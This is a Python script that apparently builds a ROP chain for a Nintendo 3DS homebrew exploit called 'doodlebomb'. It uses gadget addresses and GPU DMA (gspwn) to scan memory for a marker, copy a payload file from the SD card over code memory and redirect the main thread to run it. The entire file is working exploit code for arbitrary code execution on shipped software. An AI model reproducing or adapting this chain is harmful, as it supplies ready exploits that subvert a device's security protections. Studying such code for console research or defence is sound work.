from constants import *
import os
include("macros.py")

LOOP_DST = LINEAR_BUFFER + 0xC00000
FILE_DST = LINEAR_BUFFER + 0xB00000
LOADER_ARBITER_HANDLE = 0x0fff0000

set_mem_offset(STAGE1_DEST)

deref_to_r0(APPMEMTYPE)
add_r0(0x100000000-0x6)
compare_r0_0()
store_if_equal(LINEAR_BUFFER + 0x07C00000 - CODEBIN_MAX_SIZE, loop_src)

memcpy(scan_pattern, PAYLOAD_VA, 0x20)


begin_area(0x21C)
put_label("scan_loop")

add_word(GSPGPU_GXTRYENQUEUE_WRAPPER)
add_word(0x4)
put_label("loop_src")
add_word(LINEAR_BUFFER + 0x04000000 - CODEBIN_MAX_SIZE)
add_word(LOOP_DST)
add_word(SCANLOOP_STRIDE)
add_word(0xFFFFFFFF)
add_word(0xFFFFFFFF)
add_word(0x8)
add_word(0x0)

add_word(0x0)

garbage(4)

sleep(100*1000)

store(GSPGPU_GXTRYENQUEUE_WRAPPER, scan_loop)

compare(LOOP_DST, scan_pattern, 0x20)
add_r0(0x100000000 - 0x1)
compare_r0_0()
store_if_equal(NOP, loop_pivot) #if magicval has been found, then overwrite the sub sp gadget to break the loop

deref_to_r0(loop_src)
add_r0(SCANLOOP_STRIDE) #next mempage
store_r0(loop_src)

flush_dcache(LOOP_DST, SCANLOOP_STRIDE)

pop(r0=NOP_ptr_min_0x14) #branch to NOP after sub sp

put_label("loop_off")
fill(scan_loop+0x21C-loop_off-4, NOP, 4) #fill the remaining space with NOP until the appropriate size is reached

put_label("loop_pivot")
add_word(SUB_SPSP_21C_LDR_R1R0_LDR_R1R1_14_BLX_R1) #go back to scan_loop

end_area()


deref_to_r0(loop_src)
add_r0(0x100000000 - SCANLOOP_STRIDE) #after the scanloop is broken, magicval is at *(loop_src) - SCANLOOP_STRIDE
store_r0(final_dst)                   #store the location for the final gspwn

mount_sdmc(sdmc_string)
try_open_file(context, file_path, FSFILE_READ)
try_get_size(context, file_size)
try_read_file(context, 0, 0, bytes_read, file_size, FILE_DST)
close_file(context)

flush_dcache(FILE_DST, 0x100000)

add_word(GSPGPU_GXTRYENQUEUE_WRAPPER)
add_word(0x4)
add_word(FILE_DST)
put_label("final_dst")
add_word(0xDEADC0DE)
add_word(0x2000)
add_word(0xFFFFFFFF)
add_word(0xFFFFFFFF)
add_word(0x8)
add_word(0x0)

add_word(0x0)

garbage(4)

sleep(600*1000*1000)


store(jump_addr_min_0xC, MAIN_THREAD_JUMP_PTR) #after the main loop is broken, the main thread jumps to *(*(MAIN_THREAD_JUMP_PTR) + 0xC)
                                               #we overwrite it so it will jump to PAYLOAD_VA
store(0x0, MAIN_THREAD_LOOP_BREAK)             #break the main loop

add_word(SVC_EXIT_THREAD)                      #close this thread

#add_word(PAYLOAD_VA)

put_label("scan_pattern")
fill(0x20, 0)

put_label("jump_addr_min_0xC")
add_word(jump_addr_min_0xC)
garbage(2)
add_word(PAYLOAD_VA)

put_label("NOP_ptr_min_0x14")
add_word(NOP_ptr_min_0x14)

put_label("sdmc_string")
add_ascii("sdmc:\0\0\0")

put_label("file_size")
add_word(0x0)
add_word(0x0)

put_label("NOP_ptr")
add_word(NOP)

put_label("bytes_read")
add_word(0x0)

put_label("context")
fill(0x20, 0)

put_label("file_path")
add_utf16("sdmc:/doodlebomb/initial.bin\0")
